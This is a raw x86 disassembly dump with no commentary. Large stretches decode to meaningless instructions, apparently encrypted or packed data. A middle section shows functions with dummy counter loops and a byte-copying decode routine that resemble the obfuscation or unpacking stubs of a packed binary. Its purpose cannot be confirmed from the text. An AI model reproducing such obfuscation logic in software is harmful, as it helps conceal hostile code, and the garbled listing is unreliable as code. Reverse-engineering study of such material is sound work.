  40399b:	xor    BYTE PTR ds:0x36ff7a2e,0xb0
  4039a2:	mov    DWORD PTR [ecx+0x9dd5486],ecx
  4039a8:	xchg   ecx,eax
  4039a9:	gs pop es
  4039ab:	int3   
  4039ac:	mov    al,ds:0xe7aadd65
  4039b1:	inc    edi
  4039b2:	adc    al,0x10
  4039b4:	xor    bl,BYTE PTR [ecx+0x5]
  4039b7:	mov    ebp,0xe43823a2
  4039bc:	fsubr  QWORD PTR [ecx-0x4ebd03d5]
  4039c2:	mov    edi,0x6d509875
  4039c7:	jnp    0x403970
  4039c9:	js     0x4039b6
  4039cb:	adc    eax,0x799bd816
  4039d0:	jb     0x403a14
  4039d2:	fsubrp st(3),st
  4039d4:	cmp    DWORD PTR [ebp+eiz*4+0x5eb19d6b],ecx
  4039db:	pop    es
  4039dc:	jl     0x4039a1
  4039de:	inc    esp
  4039df:	cmp    al,0x78
  4039e1:	mov    bl,0x8a
  4039e3:	aad    0x8e
  4039e5:	call   0xcb783860
  4039ea:	ds xchg ebx,eax
  4039ec:	jnp    0x4039f0
  4039ee:	(bad)  
  4039ef:	mov    bh,0x88
  4039f1:	test   BYTE PTR [edi],al
  4039f3:	(bad)  [ebx+edx*4-0x4e]
  4039f7:	inc    esi
  4039f8:	call   0x4e3e49eb
  4039fd:	jmp    0x75c6:0x6116f3cf
  403a04:	pop    ebp
  403a05:	arpl   WORD PTR [edx],sp
  403a07:	push   eax
  403a08:	int    0x71
  403a0a:	xor    al,BYTE PTR [edi]
  403a0c:	rcl    BYTE PTR [ebx+eax*1],cl
  403a0f:	and    DWORD PTR [eax+ecx*8+0x3a],0xa5255686
  403a17:	dec    eax
  403a18:	jl     0x4039e8
  403a1a:	ss jb  0x403a7b
  403a1d:	mov    dh,0x7a
  403a1f:	enter  0xfdf2,0x97
  403a23:	shl    DWORD PTR [ecx],0x77
  403a26:	int    0x3
  403a28:	out    0xee,al
  403a2a:	pop    DWORD PTR [ebx+0x59f4904b]
  403a30:	sub    esi,0x74
  403a33:	and    DWORD PTR [edi+0x14823b19],ecx
  403a39:	rcl    DWORD PTR [esi],1
  403a3b:	mov    ch,0x9b
  403a3d:	dec    ebp
  403a3e:	inc    ecx
  403a3f:	cld    
  403a40:	retf   0xe6e1
  403a43:	mov    ah,0x35
  403a45:	xor    DWORD PTR [edi],0xab272958
  403a4b:	jne    0x403a7a
  403a4d:	mov    BYTE PTR [edi-0x681acd5c],ah
  403a53:	mov    bl,0x4a
  403a55:	sub    DWORD PTR [ecx+ecx*1+0x7a825315],ecx
  403a5c:	retf   
  403a5d:	loope  0x4039e0
  403a5f:	dec    ecx
  403a60:	sbb    al,0x9c
  403a62:	sbb    DWORD PTR [eax+ebp*4+0x1d],eax
  403a66:	or     ebx,DWORD PTR [edi-0x2c0d6ca4]
  403a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a6d:	fs xchg edi,eax
  403a6f:	call   0x7fbf:0x36d43e2b
  403a76:	cmp    ah,BYTE PTR [edx+0xc]
  403a79:	cmp    esp,DWORD PTR [ecx]
  403a7b:	push   ebp
  403a7c:	inc    edx
  403a7d:	rcr    ebp,1
  403a7f:	adc    BYTE PTR [ecx],dh
  403a81:	retf   
  403a82:	fnsave [edx]
  403a84:	cmp    dh,al
  403a86:	shr    BYTE PTR [ebp+edi*8-0x2a],0x99
  403a8b:	lahf   
  403a8c:	xchg   esi,eax
  403a8d:	bound  edi,QWORD PTR [ebx+0x47]
  403a90:	mov    ebx,0x58f7e05b
  403a95:	jle    0x403aeb
  403a97:	push   esi
  403a98:	jecxz  0x403a27
  403a9a:	pusha  
  403a9b:	pop    eax
  403a9c:	xor    ah,BYTE PTR [esi]
  403a9e:	por    mm1,QWORD PTR [ecx+0x6101e942]
  403aa5:	or     al,0xe5
  403aa7:	mov    edi,0x59c4f270
  403aac:	adc    eax,0x10e160d9
  403ab1:	xor    al,0x5d
  403ab3:	inc    ebp
  403ab4:	push   0x48365d4d
  403ab9:	ficom  DWORD PTR [edi]
  403abb:	out    dx,al
  403abc:	xor    BYTE PTR [edx],bh
  403abe:	out    dx,eax
  403abf:	cmp    eax,0x70b50968
  403ac4:	fdiv   QWORD PTR [edi]
  403ac6:	jns    0x403a8a
  403ac8:	mov    dh,0x5b
  403aca:	mov    edi,0xcfadd607
  403acf:	xor    eax,0xebdc7799
  403ad4:	xchg   ebx,eax
  403ad5:	repz mov ebp,0x2c5578b0
  403adb:	les    edi,FWORD PTR [ebx]
  403add:	xchg   ebp,eax
  403ade:	jo     0x403b24
  403ae0:	dec    ebx
  403ae1:	shl    BYTE PTR [esi+0x0],1
  403ae4:	daa    
  403ae5:	jle    0x403ad4
  403ae7:	mov    al,0xed
  403ae9:	es mov esi,0x3c2e7b70
  403aef:	inc    ebp
  403af0:	and    eax,DWORD PTR [eax-0x6da75644]
  403af6:	xor    ebp,DWORD PTR [eax]
  403af8:	cs or  dl,ch
  403afb:	mov    dh,0x7a
  403afd:	jg     0x403aaf
  403aff:	add    edx,0xe69c2cbc
  403b05:	mov    edi,0xd461d154
  403b0a:	cld    
  403b0b:	pop    eax
  403b0c:	mov    ds:0x9fa1c0a3,al
  403b11:	jmp    0xc6ee:0xf66d7781
  403b18:	sbb    cl,cl
  403b1a:	adc    BYTE PTR [edi+eiz*2+0x3e21b9b8],bh
  403b21:	lods   al,BYTE PTR ds:[esi]
  403b22:	inc    ecx
  403b23:	fidivr DWORD PTR [esi+0x63b82118]
  403b29:	outs   dx,BYTE PTR ds:[esi]
  403b2a:	arpl   WORD PTR [edi+0x2d],cx
  403b2d:	pop    esi
  403b2e:	and    dl,cl
  403b30:	or     BYTE PTR [ebx],ch
  403b32:	lock arpl WORD PTR [edi+ebp*8-0x3d4a8a2],sp
  403b3a:	mov    dl,0x7a
  403b3c:	adc    esi,DWORD PTR ds:0xdd68777a
  403b42:	pushf  
  403b43:	xchg   al,bl
  403b45:	es aas 
  403b47:	loopne 0x403b3d
  403b49:	rcr    DWORD PTR [esi],0x5f
  403b4c:	stos   DWORD PTR es:[edi],eax
  403b4d:	push   ebx
  403b4e:	ss push 0xba93ea01
  403b54:	add    esi,DWORD PTR [edi-0x5a]
  403b57:	stos   BYTE PTR es:[edi],al
  403b58:	pop    ds
  403b59:	mov    al,ds:0x8a1d6082
  403b5e:	cs mov edx,0x5cdbc43f
  403b64:	and    al,0x6f
  403b66:	nop
  403b67:	add    al,0xe1
  403b69:	fwait
  403b6a:	pop    ds
  403b6b:	push   ds
  403b6c:	adc    BYTE PTR [ebx+edx*4],0x13
  403b70:	fcmovbe st,st(7)
  403b72:	mov    cl,0xaf
  403b74:	aam    0xcf
  403b76:	cdq    
  403b77:	sub    bl,dl
  403b79:	push   esi
  403b7a:	mov    ah,0x85
  403b7c:	fld    TBYTE PTR [esi-0x3849b77a]
  403b82:	push   0x69320114
  403b87:	imul   edx,DWORD PTR [ebx+0x1b],0x623d443d
  403b8e:	in     al,dx
  403b8f:	jp     0x403ba8
  403b91:	and    eax,0x81d82783
  403b96:	mov    edx,0xc142dc91
  403b9b:	fdivr  QWORD PTR [ebx-0x1d4b08e]
  403ba1:	pop    eax
  403ba2:	lds    ebp,FWORD PTR [ecx-0x6762c01f]
  403ba8:	js     0x403b2a
  403baa:	pop    ebp
  403bab:	outs   dx,DWORD PTR ds:[esi]
  403bac:	inc    esi
  403bad:	je     0x403bcf
  403baf:	jmp    0xf52cc90a
  403bb4:	mov    DWORD PTR [eax],esp
  403bb6:	aas    
  403bb7:	adc    BYTE PTR [esi+0x2915cc72],al
  403bbd:	sti    
  403bbe:	push   esi
  403bbf:	scas   al,BYTE PTR es:[edi]
  403bc0:	loopne 0x403bb0
  403bc2:	mov    bh,0xe9
  403bc4:	retf   0x3cad
  403bc7:	loop   0x403bdb
  403bc9:	cmc    
  403bca:	xchg   edx,eax
  403bcb:	pop    es
  403bcc:	xacquire xchg BYTE PTR [eax],dl
  403bcf:	in     al,0x9d
  403bd1:	aam    0x67
  403bd3:	fwait
  403bd4:	sar    ch,cl
  403bd6:	push   edx
  403bd7:	mov    ah,0x62
  403bd9:	stc    
  403bda:	stos   DWORD PTR es:[edi],eax
  403bdb:	mov    WORD PTR ds:0x7df1522a,cs
  403be1:	or     dl,BYTE PTR ds:0x5549f903
  403be7:	xchg   ebp,eax
  403be8:	aaa    
  403be9:	ss jle 0x403c0b
  403bec:	mov    dh,0x89
  403bee:	sub    bh,BYTE PTR [ebx]
  403bf0:	mov    dh,0x2b
  403bf2:	ret    
  403bf3:	pop    esp
  403bf4:	and    DWORD PTR ds:0xed3003c0,eax
  403bfa:	pop    esi
  403bfb:	and    BYTE PTR [ecx],dl
  403bfd:	in     eax,0xa8
  403bff:	adc    BYTE PTR [edi],al
  403c01:	sbb    al,0xc6
  403c03:	sbb    BYTE PTR [eax],cl
  403c05:	cmp    DWORD PTR [eax-0x4708b6db],eax
  403c0b:	dec    ebx
  403c0c:	xchg   esi,eax
  403c0d:	jmp    0xd88f:0xb1706d16
  403c14:	push   edx
  403c15:	cmp    DWORD PTR ds:0x3b9d09d9,esp
  403c1b:	rcr    DWORD PTR [ecx-0x113cffc5],0xa
  403c22:	jnp    0x403bba
  403c24:	call   0xee019c73
  403c29:	push   edi
  403c2a:	cs dec ebx
  403c2c:	test   BYTE PTR [ecx],cl
  403c2e:	cs popf 
  403c30:	jmp    0x67c8:0xaf67281c
  403c37:	gs sbb eax,0x98fea396
  403c3d:	jns    0x403c54
  403c3f:	mov    ds:0x84c3d096,al
  403c44:	cdq    
  403c45:	ret    0x440
  403c48:	or     BYTE PTR [edx+0x4a],ch
  403c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c4c:	cld    
  403c4d:	icebp  
  403c4e:	dec    esp
  403c4f:	(bad)
  403c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c54:	nop
  403c55:	pop    eax
  403c56:	in     eax,dx
  403c57:	dec    esi
  403c58:	mov    edx,0x963e21f3
  403c5d:	jnp    0x403c0d
  403c5f:	cmc    
  403c60:	enter  0x1543,0x2a
  403c64:	mov    ds:0xd1d8ca2a,eax
  403c69:	stc    
  403c6a:	jbe    0x403c48
  403c6c:	scas   eax,DWORD PTR es:[edi]
  403c6d:	mov    ebx,0x839f0e02
  403c72:	int    0x90
  403c74:	loope  0x403cc9
  403c76:	outs   dx,BYTE PTR ds:[esi]
  403c77:	pop    ecx
  403c78:	sub    al,BYTE PTR [ebp+0x5d]
  403c7b:	in     eax,0xf5
  403c7d:	into   
  403c7e:	cli    
  403c7f:	add    al,0x33
  403c81:	enter  0x4d89,0x8
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41ff1f
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0xf09c947b
  4042a6:	loop   0x404265
  4042a8:	pop    es
  4042a9:	sbb    bl,BYTE PTR [edi+0x62]
  4042ac:	bound  ebp,QWORD PTR [edx]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx+0x5a]
  4042b2:	add    edi,DWORD PTR cs:[edx+0x6b]
  4042b6:	dec    esi
  4042b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042b8:	jle    0x40427f
  4042ba:	xchg   esi,eax
  4042bb:	into   
  4042bc:	aam    0xe8
  4042be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042bf:	mov    edi,0x8f8c02f0
  4042c4:	sub    al,0x54
  4042c6:	jg     0x404269
  4042c8:	pop    ecx
  4042c9:	(bad)  
  4042ca:	std    
  4042cb:	fisubr DWORD PTR [edi]
  4042cd:	retf   
  4042ce:	pop    ebx
  4042cf:	and    bl,BYTE PTR [edx-0x761d855c]
  4042d5:	mov    cl,0x9d
  4042d7:	es ret 0x802
  4042db:	ret    
  4042dc:	jno    0x40433c
  4042de:	inc    esp
  4042df:	add    bl,BYTE PTR ds:0x9aadf434
  4042e5:	xor    bh,BYTE PTR [ebx-0x78]
  4042e8:	jecxz  0x40429a
  4042ea:	mov    edx,ecx
  4042ec:	mov    bh,0x1f
  4042ee:	jecxz  0x4042a0
  4042f0:	sub    bl,BYTE PTR [edx+0x7c]
  4042f3:	lea    edi,fs:[edx-0x3a]
  4042f7:	ds add eax,0xc2e71d6
  4042fd:	les    ebp,FWORD PTR [ebp-0xfb26e6b]
  404303:	lods   al,BYTE PTR ds:[esi]
  404304:	push   es
  404305:	pop    ebp
  404306:	cmp    DWORD PTR [edx-0x16f2bf87],0x18
  40430d:	arpl   WORD PTR [ebx-0x69cfb2eb],sp
  404313:	cmp    esp,eax
  404315:	stc    
  404316:	fist   DWORD PTR [edi-0x7079dfa7]
  40431c:	cli    
  40431d:	fstp   QWORD PTR [edi+0x2dce86cd]
  404323:	ror    BYTE PTR [ebx],1
  404325:	data16 mov dl,0x45
  404328:	pop    es
  404329:	or     DWORD PTR [ebp-0x6d],eax
  40432c:	shr    BYTE PTR gs:[edi+0x7efec625],0xf5
  404334:	test   al,0xb3
  404336:	cmp    al,0x82
  404338:	test   al,0x14
  40433a:	stc    
  40433b:	loope  0x4043a2
  40433d:	test   DWORD PTR [ecx-0x1b],0x684ca855
  404344:	aas    
  404345:	dec    esi
  404346:	or     DWORD PTR [edx+0x4c],esp
  404349:	or     al,0xe4
  40434b:	push   0x9fc5d165
  404350:	popa   
  404351:	dec    esi
  404352:	(bad)  
  404353:	mov    ds:0xe161cbe3,eax
  404358:	pop    ebx
  404359:	jmp    0x5b500f7
  40435e:	int    0x3a
  404360:	jge    0x40437e
  404362:	outs   dx,DWORD PTR ds:[esi]
  404363:	inc    ebx
  404364:	fsubp  st(5),st
  404366:	jne    0x40434d
  404368:	ficom  WORD PTR [ebx+0x3275495]
  40436e:	sti    
  40436f:	retf   
  404370:	sbb    bl,BYTE PTR [edi]
  404372:	sbb    eax,0x7da8effe
  404377:	aas    
  404378:	ret    
  404379:	push   es
  40437a:	jo     0x40430e
  40437c:	enter  0x315e,0xed
  404380:	fistp  WORD PTR [ecx]
  404382:	xor    al,0xdf
  404384:	mov    cl,0x34
  404386:	data16 fstp DWORD PTR [edx]
  404389:	(bad)  
  40438a:	mov    bl,0x5e
  40438c:	test   al,0x7d
  40438e:	xchg   ebx,eax
  40438f:	pop    esi
  404390:	inc    eax
  404391:	jae    0x404372
  404393:	or     ecx,DWORD PTR [edx+0x37]
  404396:	cmp    al,0x8d
  404398:	sub    eax,0x80cf21f4
  40439d:	add    BYTE PTR [eax],ch
  40439f:	xor    BYTE PTR [ebx-0x52],ch
  4043a2:	out    dx,al
  4043a3:	adc    dl,BYTE PTR [edx-0x53]
  4043a6:	je     0x4043a2
  4043a8:	jg     0x404356
  4043aa:	adc    bh,dl
  4043ac:	jmp    0x9ecd:0x70e996bf
  4043b3:	jb     0x40440d
  4043b5:	call   DWORD PTR [eax]
  4043b7:	outs   dx,BYTE PTR ds:[esi]
  4043b8:	pop    ecx
  4043b9:	rcl    BYTE PTR [esi],1
  4043bb:	hlt    
  4043bc:	add    ch,dl
  4043be:	retf   0xd7a9
  4043c1:	inc    ebp
  4043c2:	out    0x2b,eax
  4043c4:	in     al,dx
  4043c5:	jecxz  0x4043d6
  4043c7:	cmp    al,0x8c
  4043c9:	ds loop 0x404397
  4043cc:	(bad)  
  4043cd:	sbb    eax,0x25217023
